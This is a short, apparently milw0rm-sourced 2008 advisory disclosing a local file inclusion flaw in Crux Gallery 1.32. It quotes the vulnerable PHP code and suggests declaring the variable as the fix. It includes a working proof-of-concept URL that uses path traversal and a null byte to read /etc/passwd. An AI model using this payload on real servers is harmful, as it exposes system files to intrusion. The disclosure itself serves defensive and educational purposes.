@@ -1,0 +1,19 @@
+ ~~+=========================================================+~~
+ ~~+=========================================================+~~
+  [?] Crux Gallery <= 1.32 Local File Inclusion Vulnerability
+  [?] Discovered On: 01/10/2008
+  [*] PHP.ini 
+  [*] Magic_Quotes_Gpc = Off
+ ~~+=========================================================+~~
+  (index.php) // Greetz -> Osirys and darkjoker
+  14. $m = $_GET['m'];
+  15. $p = $_GET['p'];
+  16. $dir = $_GET['dir'];
+  17. require_once("main.php");
+  18. require_once("themes/".$theme."/theme.php"); 
+  $theme  isn't declared, so you can include any file.
+  [*] http//[path]/index.php?theme=../../../../../etc/passwd%00
+  [*] How To Fix: declare $theme
+  ~~+=========================================================+~~
+
+# milw0rm.com [2008-10-01]
